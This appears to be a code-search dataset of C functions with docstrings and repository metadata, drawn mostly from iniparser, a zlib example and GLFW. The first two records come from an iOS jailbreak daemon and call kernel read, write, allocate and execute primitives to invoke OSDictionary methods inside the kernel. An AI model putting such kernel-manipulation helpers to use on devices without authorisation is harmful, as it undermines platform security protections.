{"docstring": "// 1 on success, 0 on error\n", "func_signal": "int OSDictionary_Merge(uint64_t dict, uint64_t aDict)", "code": "{\n\tuint64_t vtab = rk64(dict);\n\tuint64_t f = rk64(vtab + off_OSDictionary_Merge);\n\n\treturn (int) kexecute(f, dict, aDict, 0, 0, 0, 0, 0);\n}", "path": "basebinaries\\jailbreakd\\osobject.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// address if exists, 0 if not\n", "func_signal": "uint64_t _OSDictionary_GetItem(uint64_t dict, const char *key)", "code": "{\n\tsize_t len = strlen(key) + 1;\n\n\tuint64_t ks = kalloc(len);\n\tkwrite(ks, key, len);\n\n\tuint64_t vtab = rk64(dict);\n\tuint64_t f = rk64(vtab + off_OSDictionary_GetObjectWithCharP);\n\n\tint rv = (int) kexecute(f, dict, ks, 0, 0, 0, 0, 0);\n\n\tkfree(ks, len);\n\n\treturn rv;\n}", "path": "basebinaries\\jailbreakd\\osobject.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Save a dictionary to a loadable ini file\n  @param    d   Dictionary to dump\n  @param    f   Opened file pointer to dump to\n  @return   void\n\n  This function dumps a given dictionary into a loadable ini file.\n  It is Ok to specify @c stderr or @c stdout as output files.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "void iniparser_dump_ini(const dictionary * d, FILE * f)", "code": "{\n    int          i ;\n    int          nsec ;\n    const char * secname ;\n\n    if (d==NULL || f==NULL) return ;\n\n    nsec = iniparser_getnsec(d);\n    if (nsec<1) {\n        /* No section in file: dump all keys as they are */\n        for (i=0 ; i<d->size ; i++) {\n            if (d->key[i]==NULL)\n                continue ;\n            fprintf(f, \"%s = %s\\n\", d->key[i], d->val[i]);\n        }\n        return ;\n    }\n    for (i=0 ; i<nsec ; i++) {\n        secname = iniparser_getsecname(d, i) ;\n        iniparser_dumpsection_ini(d, secname, f);\n    }\n    fprintf(f, \"\\n\");\n    return ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Double the size of the dictionary\n  @param    d Dictionary to grow\n  @return   This function returns non-zero in case of failure\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "static int dictionary_grow(dictionary * d)", "code": "{\n    char        ** new_val ;\n    char        ** new_key ;\n    unsigned     * new_hash ;\n\n    new_val  = (char**) calloc(d->size * 2, sizeof *d->val);\n    new_key  = (char**) calloc(d->size * 2, sizeof *d->key);\n    new_hash = (unsigned*) calloc(d->size * 2, sizeof *d->hash);\n    if (!new_val || !new_key || !new_hash) {\n        /* An allocation failed, leave the dictionary unchanged */\n        if (new_val)\n            free(new_val);\n        if (new_key)\n            free(new_key);\n        if (new_hash)\n            free(new_hash);\n        return -1 ;\n    }\n    /* Initialize the newly allocated space */\n    memcpy(new_val, d->val, d->size * sizeof(char *));\n    memcpy(new_key, d->key, d->size * sizeof(char *));\n    memcpy(new_hash, d->hash, d->size * sizeof(unsigned));\n    /* Delete previous data */\n    free(d->val);\n    free(d->key);\n    free(d->hash);\n    /* Actually update the dictionary */\n    d->size *= 2 ;\n    d->val = new_val;\n    d->key = new_key;\n    d->hash = new_hash;\n    return 0 ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\dictionary.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*--------------------------------------------------------------------------*/\n", "func_signal": "int dictionary_set(dictionary * d, const char * key, const char * val)", "code": "{\n    size_t         i ;\n    unsigned       hash ;\n\n    if (d==NULL || key==NULL) return -1 ;\n\n    /* Compute hash for this key */\n    hash = dictionary_hash(key) ;\n    /* Find if value is already in dictionary */\n    if (d->n>0) {\n        for (i=0 ; i<d->size ; i++) {\n            if (d->key[i]==NULL)\n                continue ;\n            if (hash==d->hash[i]) { /* Same hash value */\n                if (!strcmp(key, d->key[i])) {   /* Same key */\n                    /* Found a value: modify and return */\n                    if (d->val[i]!=NULL)\n                        free(d->val[i]);\n                    d->val[i] = (val ? xstrdup(val) : NULL);\n                    /* Value has been modified: return */\n                    return 0 ;\n                }\n            }\n        }\n    }\n    /* Add a new value */\n    /* See if dictionary needs to grow */\n    if (d->n==d->size) {\n        /* Reached maximum size: reallocate dictionary */\n        if (dictionary_grow(d) != 0)\n            return -1;\n    }\n\n    /* Insert key in the first empty slot. Start at d->n and wrap at\n       d->size. Because d->n < d->size this will necessarily\n       terminate. */\n    for (i=d->n ; d->key[i] ; ) {\n        if(++i == d->size) i = 0;\n    }\n    /* Copy key */\n    d->key[i]  = xstrdup(key);\n    d->val[i]  = (val ? xstrdup(val) : NULL) ;\n    d->hash[i] = hash;\n    d->n ++ ;\n    return 0 ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\dictionary.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Get the string associated to a key, convert to a double\n  @param    d Dictionary to search\n  @param    key Key string to look for\n  @param    notfound Value to return in case of error\n  @return   double\n\n  This function queries a dictionary for a key. A key as read from an\n  ini file is given as \"section:key\". If the key cannot be found,\n  the notfound value is returned.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "double iniparser_getdouble(const dictionary * d, const char * key, double notfound)", "code": "{\n    const char * str ;\n\n    str = iniparser_getstring(d, key, INI_INVALID_KEY);\n    if (str==INI_INVALID_KEY) return notfound ;\n    return atof(str);\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Duplicate a string\n  @param    s String to duplicate\n  @return   Pointer to a newly allocated string, to be freed with free()\n\n  This is a replacement for strdup(). This implementation is provided\n  for systems that do not have it.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "static char * xstrdup(const char * s)", "code": "{\n    char * t ;\n    size_t len ;\n    if (!s)\n        return NULL ;\n\n    len = strlen(s) + 1 ;\n    t = (char*) malloc(len) ;\n    if (t) {\n        memcpy(t, s, len) ;\n    }\n    return t ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Dump a dictionary to an opened file pointer.\n  @param    d   Dictionary to dump.\n  @param    f   Opened file pointer to dump to.\n  @return   void\n\n  This function prints out the contents of a dictionary, one element by\n  line, onto the provided file pointer. It is OK to specify @c stderr\n  or @c stdout as output files. This function is meant for debugging\n  purposes mostly.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "void iniparser_dump(const dictionary * d, FILE * f)", "code": "{\n    int     i ;\n\n    if (d==NULL || f==NULL) return ;\n    for (i=0 ; i<d->size ; i++) {\n        if (d->key[i]==NULL)\n            continue ;\n        if (d->val[i]!=NULL) {\n            fprintf(f, \"[%s]=[%s]\\n\", d->key[i], d->val[i]);\n        } else {\n            fprintf(f, \"[%s]=UNDEF\\n\", d->key[i]);\n        }\n    }\n    return ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*--------------------------------------------------------------------------*/\n", "func_signal": "int iniparser_getboolean(const dictionary * d, const char * key, int notfound)", "code": "{\n    int          ret ;\n    const char * c ;\n\n    c = iniparser_getstring(d, key, INI_INVALID_KEY);\n    if (c==INI_INVALID_KEY) return notfound ;\n    if (c[0]=='y' || c[0]=='Y' || c[0]=='1' || c[0]=='t' || c[0]=='T') {\n        ret = 1 ;\n    } else if (c[0]=='n' || c[0]=='N' || c[0]=='0' || c[0]=='f' || c[0]=='F') {\n        ret = 0 ;\n    } else {\n        ret = notfound ;\n    }\n    return ret;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Get the string associated to a key\n  @param    d       Dictionary to search\n  @param    key     Key string to look for\n  @param    def     Default value to return if key not found.\n  @return   pointer to statically allocated character string\n\n  This function queries a dictionary for a key. A key as read from an\n  ini file is given as \"section:key\". If the key cannot be found,\n  the pointer passed as 'def' is returned.\n  The returned char pointer is pointing to a string allocated in\n  the dictionary, do not free or modify it.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "const char * iniparser_getstring(const dictionary * d, const char * key, const char * def)", "code": "{\n    const char * lc_key ;\n    const char * sval ;\n    char tmp_str[ASCIILINESZ+1];\n\n    if (d==NULL || key==NULL)\n        return def ;\n\n    lc_key = strlwc(key, tmp_str, sizeof(tmp_str));\n    sval = dictionary_get(d, lc_key, def);\n    return sval ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Get the number of keys in a section of a dictionary.\n  @param    d    Dictionary to examine\n  @param    s    Section name of dictionary to examine\n  @param    keys Already allocated array to store the keys in\n  @return   The pointer passed as `keys` argument or NULL in case of error\n\n  This function queries a dictionary and finds all keys in a given section.\n  The keys argument should be an array of pointers which size has been\n  determined by calling `iniparser_getsecnkeys` function prior to this one.\n\n  Each pointer in the returned char pointer-to-pointer is pointing to\n  a string allocated in the dictionary; do not free or modify them.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "const char ** iniparser_getseckeys(const dictionary * d, const char * s, const char ** keys)", "code": "{\n    int i, j, seclen ;\n    char keym[ASCIILINESZ+1];\n\n    if (d==NULL || keys==NULL) return NULL;\n    if (! iniparser_find_entry(d, s)) return NULL;\n\n    seclen  = (int)strlen(s);\n    strlwc(s, keym, sizeof(keym));\n    keym[seclen] = ':';\n\n    i = 0;\n\n    for (j=0 ; j<d->size ; j++) {\n        if (d->key[j]==NULL)\n            continue ;\n        if (!strncmp(d->key[j], keym, seclen+1)) {\n            keys[i] = d->key[j];\n            i++;\n        }\n    }\n\n    return keys;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Set an entry in a dictionary.\n  @param    ini     Dictionary to modify.\n  @param    entry   Entry to modify (entry name)\n  @param    val     New value to associate to the entry.\n  @return   int 0 if Ok, -1 otherwise.\n\n  If the given entry can be found in the dictionary, it is modified to\n  contain the provided value. If it cannot be found, the entry is created.\n  It is Ok to set val to NULL.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "int iniparser_set(dictionary * ini, const char * entry, const char * val)", "code": "{\n    char tmp_str[ASCIILINESZ+1];\n    return dictionary_set(ini, strlwc(entry, tmp_str, sizeof(tmp_str)), val) ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Configure a function to receive the error messages.\n  @param    errback  Function to call.\n\n  By default, the error will be printed on stderr. If a null pointer is passed\n  as errback the error callback will be switched back to default.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "void iniparser_set_error_callback(int (*errback)(const char *, ...))", "code": "{\n  if (errback) {\n    iniparser_error_callback = errback;\n  } else {\n    iniparser_error_callback = default_error_callback;\n  }\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Get a value from a dictionary.\n  @param    d       dictionary object to search.\n  @param    key     Key to look for in the dictionary.\n  @param    def     Default value to return if key not found.\n  @return   1 pointer to internally allocated character string.\n\n  This function locates a key in a dictionary and returns a pointer to its\n  value, or the passed 'def' pointer if no such key can be found in\n  dictionary. The returned character pointer points to data internal to the\n  dictionary object, you should not try to free it or modify it.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "const char * dictionary_get(const dictionary * d, const char * key, const char * def)", "code": "{\n    unsigned    hash ;\n    size_t      i ;\n\n    hash = dictionary_hash(key);\n    for (i=0 ; i<d->size ; i++) {\n        if (d->key[i]==NULL)\n            continue ;\n        /* Compare hash */\n        if (hash==d->hash[i]) {\n            /* Compare string, to avoid hash collisions */\n            if (!strcmp(key, d->key[i])) {\n                return d->val[i] ;\n            }\n        }\n    }\n    return def ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\dictionary.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/* compress or decompress from stdin to stdout */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int ret;\n\n    /* avoid end-of-line conversions */\n    SET_BINARY_MODE(stdin);\n    SET_BINARY_MODE(stdout);\n\n    /* do compression if no arguments */\n    if (argc == 1) {\n        ret = def(stdin, stdout, Z_DEFAULT_COMPRESSION);\n        if (ret != Z_OK)\n            zerr(ret);\n        return ret;\n    }\n\n    /* do decompression if -d specified */\n    else if (argc == 2 && strcmp(argv[1], \"-d\") == 0) {\n        ret = inf(stdin, stdout);\n        if (ret != Z_OK)\n            zerr(ret);\n        return ret;\n    }\n\n    /* otherwise, report usage */\n    else {\n        fputs(\"zpipe usage: zpipe [-d] < source > dest\\n\", stderr);\n        return 1;\n    }\n}", "path": "pcw_updatedecrypt\\3rd-party\\zlib-1.2.11\\examples\\zpipe.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Remove blanks at the beginning and the end of a string.\n  @param    str  String to parse and alter.\n  @return   unsigned New size of the string.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "static unsigned strstrip(char * s)", "code": "{\n    char *last = NULL ;\n    char *dest = s;\n\n    if (s==NULL) return 0;\n\n    last = s + strlen(s);\n    while (isspace((int)*s) && *s) s++;\n    while (last > s) {\n        if (!isspace((int)*(last-1)))\n            break ;\n        last -- ;\n    }\n    *last = (char)0;\n\n    memmove(dest,s,last - s + 1);\n    return last - s;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Delete a dictionary object\n  @param    d   dictionary object to deallocate.\n  @return   void\n\n  Deallocate a dictionary object and all memory associated to it.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "void dictionary_del(dictionary * d)", "code": "{\n    size_t  i ;\n\n    if (d==NULL) return ;\n    for (i=0 ; i<d->size ; i++) {\n        if (d->key[i]!=NULL)\n            free(d->key[i]);\n        if (d->val[i]!=NULL)\n            free(d->val[i]);\n    }\n    free(d->val);\n    free(d->key);\n    free(d->hash);\n    free(d);\n    return ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\dictionary.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Load a single line from an INI file\n  @param    input_line  Input line, may be concatenated multi-line input\n  @param    section     Output space to store section\n  @param    key         Output space to store key\n  @param    value       Output space to store value\n  @return   line_status value\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "static line_status iniparser_line(\n    const char * input_line,\n    char * section,\n    char * key,\n    char * value)", "code": "{\n    line_status sta ;\n    char * line = NULL;\n    size_t      len ;\n\n    line = xstrdup(input_line);\n    len = strstrip(line);\n\n    sta = LINE_UNPROCESSED ;\n    if (len<1) {\n        /* Empty line */\n        sta = LINE_EMPTY ;\n    } else if (line[0]=='#' || line[0]==';') {\n        /* Comment line */\n        sta = LINE_COMMENT ;\n    } else if (line[0]=='[' && line[len-1]==']') {\n        /* Section name */\n        sscanf(line, \"[%[^]]\", section);\n        strstrip(section);\n        strlwc(section, section, len);\n        sta = LINE_SECTION ;\n    } else if (sscanf (line, \"%[^=] = \\\"%[^\\\"]\\\"\", key, value) == 2\n           ||  sscanf (line, \"%[^=] = '%[^\\']'\",   key, value) == 2) {\n        /* Usual key=value with quotes, with or without comments */\n        strstrip(key);\n        strlwc(key, key, len);\n        /* Don't strip spaces from values surrounded with quotes */\n        sta = LINE_VALUE ;\n    } else if (sscanf (line, \"%[^=] = %[^;#]\", key, value) == 2) {\n        /* Usual key=value without quotes, with or without comments */\n        strstrip(key);\n        strlwc(key, key, len);\n        strstrip(value);\n        /*\n         * sscanf cannot handle '' or \"\" as empty values\n         * this is done here\n         */\n        if (!strcmp(value, \"\\\"\\\"\") || (!strcmp(value, \"''\"))) {\n            value[0]=0 ;\n        }\n        sta = LINE_VALUE ;\n    } else if (sscanf(line, \"%[^=] = %[;#]\", key, value)==2\n           ||  sscanf(line, \"%[^=] %[=]\", key, value) == 2) {\n        /*\n         * Special cases:\n         * key=\n         * key=;\n         * key=#\n         */\n        strstrip(key);\n        strlwc(key, key, len);\n        value[0]=0 ;\n        sta = LINE_VALUE ;\n    } else {\n        /* Generate syntax error */\n        sta = LINE_ERROR ;\n    }\n\n    free(line);\n    return sta ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Delete a key in a dictionary\n  @param    d       dictionary object to modify.\n  @param    key     Key to remove.\n  @return   void\n\n  This function deletes a key in a dictionary. Nothing is done if the\n  key cannot be found.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "void dictionary_unset(dictionary * d, const char * key)", "code": "{\n    unsigned    hash ;\n    size_t      i ;\n\n    if (key == NULL || d == NULL) {\n        return;\n    }\n\n    hash = dictionary_hash(key);\n    for (i=0 ; i<d->size ; i++) {\n        if (d->key[i]==NULL)\n            continue ;\n        /* Compare hash */\n        if (hash==d->hash[i]) {\n            /* Compare string, to avoid hash collisions */\n            if (!strcmp(key, d->key[i])) {\n                /* Found key */\n                break ;\n            }\n        }\n    }\n    if (i>=d->size)\n        /* Key not found */\n        return ;\n\n    free(d->key[i]);\n    d->key[i] = NULL ;\n    if (d->val[i]!=NULL) {\n        free(d->val[i]);\n        d->val[i] = NULL ;\n    }\n    d->hash[i] = 0 ;\n    d->n -- ;\n    return ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\dictionary.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Get name for section n in a dictionary.\n  @param    d   Dictionary to examine\n  @param    n   Section number (from 0 to nsec-1).\n  @return   Pointer to char string\n\n  This function locates the n-th section in a dictionary and returns\n  its name as a pointer to a string statically allocated inside the\n  dictionary. Do not free or modify the returned string!\n\n  This function returns NULL in case of error.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "const char * iniparser_getsecname(const dictionary * d, int n)", "code": "{\n    int i ;\n    int foundsec ;\n\n    if (d==NULL || n<0) return NULL ;\n    foundsec=0 ;\n    for (i=0 ; i<d->size ; i++) {\n        if (d->key[i]==NULL)\n            continue ;\n        if (strchr(d->key[i], ':')==NULL) {\n            foundsec++ ;\n            if (foundsec>n)\n                break ;\n        }\n    }\n    if (foundsec<=n) {\n        return NULL ;\n    }\n    return d->key[i] ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Save a dictionary section to a loadable ini file\n  @param    d   Dictionary to dump\n  @param    s   Section name of dictionary to dump\n  @param    f   Opened file pointer to dump to\n  @return   void\n\n  This function dumps a given section of a given dictionary into a loadable ini\n  file.  It is Ok to specify @c stderr or @c stdout as output files.\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "void iniparser_dumpsection_ini(const dictionary * d, const char * s, FILE * f)", "code": "{\n    int     j ;\n    char    keym[ASCIILINESZ+1];\n    int     seclen ;\n\n    if (d==NULL || f==NULL) return ;\n    if (! iniparser_find_entry(d, s)) return ;\n\n    seclen  = (int)strlen(s);\n    fprintf(f, \"\\n[%s]\\n\", s);\n    sprintf(keym, \"%s:\", s);\n    for (j=0 ; j<d->size ; j++) {\n        if (d->key[j]==NULL)\n            continue ;\n        if (!strncmp(d->key[j], keym, seclen+1)) {\n            fprintf(f,\n                    \"%-30s = %s\\n\",\n                    d->key[j]+seclen+1,\n                    d->val[j] ? d->val[j] : \"\");\n        }\n    }\n    fprintf(f, \"\\n\");\n    return ;\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "/*-------------------------------------------------------------------------*/\n/**\n  @brief    Get the number of keys in a section of a dictionary.\n  @param    d   Dictionary to examine\n  @param    s   Section name of dictionary to examine\n  @return   Number of keys in section\n */\n/*--------------------------------------------------------------------------*/\n", "func_signal": "int iniparser_getsecnkeys(const dictionary * d, const char * s)", "code": "{\n    int     seclen, nkeys ;\n    char    keym[ASCIILINESZ+1];\n    int j ;\n\n    nkeys = 0;\n\n    if (d==NULL) return nkeys;\n    if (! iniparser_find_entry(d, s)) return nkeys;\n\n    seclen  = (int)strlen(s);\n    strlwc(s, keym, sizeof(keym));\n    keym[seclen] = ':';\n\n    for (j=0 ; j<d->size ; j++) {\n        if (d->key[j]==NULL)\n            continue ;\n        if (!strncmp(d->key[j], keym, seclen+1))\n            nkeys++;\n    }\n\n    return nkeys;\n\n}", "path": "pcw_inidecrypt\\3rd-party\\iniparser\\src\\iniparser.c", "repo_name": "devio/Walruss", "stars": 285, "license": "None", "language": "c", "size": 1078}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                       GLFW platform API                      //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "void _glfwPlatformMakeContextCurrent(_GLFWwindow* window)", "code": "{\n    if (window)\n        wglMakeCurrent(window->wgl.dc, window->wgl.context);\n    else\n        wglMakeCurrent(NULL, NULL);\n\n    _glfwSetCurrentContext(window);\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Terminate WGL\n//\n", "func_signal": "void _glfwTerminateContextAPI(void)", "code": "{\n    if (_glfw.wgl.opengl32.instance)\n        FreeLibrary(_glfw.wgl.opengl32.instance);\n\n    _glfwTerminateTLS();\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Retrieves and translates modifier keys\n//\n", "func_signal": "static int getKeyMods(void)", "code": "{\n    int mods = 0;\n\n    if (GetKeyState(VK_SHIFT) & (1 << 31))\n        mods |= GLFW_MOD_SHIFT;\n    if (GetKeyState(VK_CONTROL) & (1 << 31))\n        mods |= GLFW_MOD_CONTROL;\n    if (GetKeyState(VK_MENU) & (1 << 31))\n        mods |= GLFW_MOD_ALT;\n    if ((GetKeyState(VK_LWIN) | GetKeyState(VK_RWIN)) & (1 << 31))\n        mods |= GLFW_MOD_SUPER;\n\n    return mods;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                       GLFW platform API                      //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "int _glfwPlatformCreateWindow(_GLFWwindow* window,\n                              const _GLFWwndconfig* wndconfig,\n                              const _GLFWctxconfig* ctxconfig,\n                              const _GLFWfbconfig* fbconfig)", "code": "{\n    int status;\n\n    if (!createWindow(window, wndconfig, ctxconfig, fbconfig))\n        return GL_FALSE;\n\n    status = _glfwAnalyzeContext(window, ctxconfig, fbconfig);\n\n    if (status == _GLFW_RECREATION_IMPOSSIBLE)\n        return GL_FALSE;\n\n    if (status == _GLFW_RECREATION_REQUIRED)\n    {\n        // Some window hints require us to re-create the context using WGL\n        // extensions retrieved through the current context, as we cannot check\n        // for WGL extensions or retrieve WGL entry points before we have a\n        // current context (actually until we have implicitly loaded the ICD)\n\n        // Yes, this is strange, and yes, this is the proper way on Win32\n\n        // As Windows only allows you to set the pixel format once for a\n        // window, we need to destroy the current window and create a new one\n        // to be able to use the new pixel format\n\n        // Technically, it may be possible to keep the old window around if\n        // we're just creating an OpenGL 3.0+ context with the same pixel\n        // format, but it's not worth the added code complexity\n\n        // First we clear the current context (the one we just created)\n        // This is usually done by glfwDestroyWindow, but as we're not doing\n        // full GLFW window destruction, it's duplicated here\n        _glfwPlatformMakeContextCurrent(NULL);\n\n        // Next destroy the Win32 window and WGL context (without resetting or\n        // destroying the GLFW window object)\n        destroyWindow(window);\n\n        // ...and then create them again, this time with better APIs\n        if (!createWindow(window, wndconfig, ctxconfig, fbconfig))\n            return GL_FALSE;\n    }\n\n    if (window->monitor)\n    {\n        _glfwPlatformShowWindow(window);\n        if (!enterFullscreenMode(window))\n            return GL_FALSE;\n    }\n\n    return GL_TRUE;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Enter full screen mode\n//\n", "func_signal": "static GLboolean enterFullscreenMode(_GLFWwindow* window)", "code": "{\n    GLFWvidmode mode;\n    GLboolean status;\n    int xpos, ypos;\n\n    status = _glfwSetVideoMode(window->monitor, &window->videoMode);\n\n    _glfwPlatformGetVideoMode(window->monitor, &mode);\n    _glfwPlatformGetMonitorPos(window->monitor, &xpos, &ypos);\n\n    SetWindowPos(window->win32.handle, HWND_TOPMOST,\n                 xpos, ypos, mode.width, mode.height, SWP_NOCOPYBITS);\n\n    return status;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Destroys the GLFW window and rendering context\n//\n", "func_signal": "static void destroyWindow(_GLFWwindow* window)", "code": "{\n    _glfwDestroyContext(window);\n\n    if (window->win32.handle)\n    {\n        DestroyWindow(window->win32.handle);\n        window->win32.handle = NULL;\n    }\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Retrieves and translates modifier keys\n//\n", "func_signal": "static int getAsyncKeyMods(void)", "code": "{\n    int mods = 0;\n\n    if (GetAsyncKeyState(VK_SHIFT) & (1 << 31))\n        mods |= GLFW_MOD_SHIFT;\n    if (GetAsyncKeyState(VK_CONTROL) & (1 << 31))\n        mods |= GLFW_MOD_CONTROL;\n    if (GetAsyncKeyState(VK_MENU) & (1 << 31))\n        mods |= GLFW_MOD_ALT;\n    if ((GetAsyncKeyState(VK_LWIN) | GetAsyncKeyState(VK_RWIN)) & (1 << 31))\n        mods |= GLFW_MOD_SUPER;\n\n    return mods;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Updates the cursor clip rect\n//\n", "func_signal": "static void updateClipRect(_GLFWwindow* window)", "code": "{\n    RECT clipRect;\n    GetClientRect(window->win32.handle, &clipRect);\n    ClientToScreen(window->win32.handle, (POINT*) &clipRect.left);\n    ClientToScreen(window->win32.handle, (POINT*) &clipRect.right);\n    ClipCursor(&clipRect);\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Hide the mouse cursor\n//\n", "func_signal": "static void hideCursor(_GLFWwindow* window)", "code": "{\n    POINT pos;\n\n    ClipCursor(NULL);\n\n    if (GetCursorPos(&pos))\n    {\n        if (WindowFromPoint(pos) == window->win32.handle)\n            SetCursor(NULL);\n    }\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
